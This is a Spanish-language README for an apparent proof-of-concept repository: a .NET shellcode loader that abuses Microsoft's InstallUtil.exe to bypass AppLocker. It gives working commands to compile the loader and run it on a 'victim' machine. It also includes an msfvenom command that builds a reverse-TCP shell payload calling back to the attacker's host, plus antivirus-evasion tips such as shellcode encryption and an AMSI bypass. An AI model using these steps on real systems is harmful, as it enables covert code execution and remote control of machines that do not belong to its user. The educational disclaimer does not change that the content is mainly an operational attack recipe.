
---

### ✅ `bypass`

```markdown
# 🚀 InstallUtil Shellcode Loader (.NET LOLBAS)

Este proyecto es una prueba de concepto que demuestra cómo abusar del binario legítimo `InstallUtil.exe` para ejecutar código arbitrario en memoria (shellcode), incluso en entornos restringidos con AppLocker habilitado. Utiliza técnicas **LOLBAS (Living Off the Land Binaries and Scripts)** para evadir controles de seguridad.

---

## 📌 ¿Qué es InstallUtil?

`InstallUtil.exe` es una herramienta legítima de Microsoft que se usa para registrar y desinstalar servicios. Se encuentra en:

- **32-bit:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
- **64-bit:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

Debido a que está firmada por Microsoft y ubicada en `C:\Windows`, AppLocker suele permitirla bajo sus reglas predeterminadas.

---

## ⚙️ Funcionamiento

Este proyecto define una clase `Installer` personalizada que sobrescribe el método `Uninstall()`. Al ejecutar `InstallUtil.exe /u`, se invoca ese método y se carga un payload (`micr0_shell`) en memoria utilizando llamadas directas a la API de Windows:

- `VirtualAlloc` – reserva memoria RWX
- `Marshal.Copy` – copia el shellcode en esa memoria
- `CreateThread` – ejecuta el shellcode
- `WaitForSingleObject` – espera a que termine

---

## ✅ Validar que AppLocker lo permite

Antes de ejecutar el ataque, asegúrate de que `InstallUtil.exe` está **permitido** por la política efectiva de AppLocker:

```powershell
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
```

Si ves:

```
PolicyDecision     MatchingRule
--------------     -------------
Allowed            All files located in the Windows folder
```

✅ ¡Puedes proceder! AppLocker permite el binario y tu bypass funcionará.

---

## 💻 Requisitos

- Sistema de destino: **Windows x64**
- Shellcode compatible con **x64**
- Acceso para ejecutar `InstallUtil.exe` (requiere permisos elevados)
- Mono (para compilar desde Linux)

---

## 🛠️ Compilación (en Linux con Mono)

```bash
sudo apt install mono-complete
mcs -target:library -platform:x64 -r:System.Configuration.Install.dll -out:NotMalware_IU.dll NotMalware_IU.cs
```

---

## 🚀 Ejecución (en Windows víctima)

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Path\NotMalware_IU.dll
```

> El método `Uninstall()` será invocado automáticamente y ejecutará el shellcode en memoria.

---

## 🧨 Generar shellcode

Puedes usar `msfvenom` para generar shellcode crudo en formato C# (byte array):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f csharp EXITFUNC=thread
```

Pega el contenido directamente dentro del `byte[] shellcode` en el archivo `.cs`.

---

## 🔐 Evasión adicional (opcional)

Para evitar detección por AV:

- Cifra el shellcode con XOR o AES
- Realiza la decodificación en tiempo de ejecución
- Cambia nombres de clases y métodos
- Aplica AMSI Bypass antes de la carga del shellcode

---

## 🧪 Estructura del repositorio

```
.
├── NotMalware_IU.cs         # Código fuente del loader
├── NotMalware_IU.dll        # Binario compilado (InstallUtil)
└── README.md                # Este archivo
```

---

## ⚠️ Disclaimer

Este código es **únicamente para fines educativos y de investigación**. El uso no autorizado de estas técnicas puede violar leyes locales o internacionales. El autor no se hace responsable del mal uso de esta herramienta. **Úsalo solo en entornos controlados y con permiso explícito.**

---

## 🔗 Referencias

- [LOLBAS Project](https://lolbas-project.github.io/)
- [Microsoft Docs - InstallUtil.exe](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool)
- [HTB Academy – Windows Evasion Techniques](https://academy.hackthebox.com/module/254/section/2833/)
```

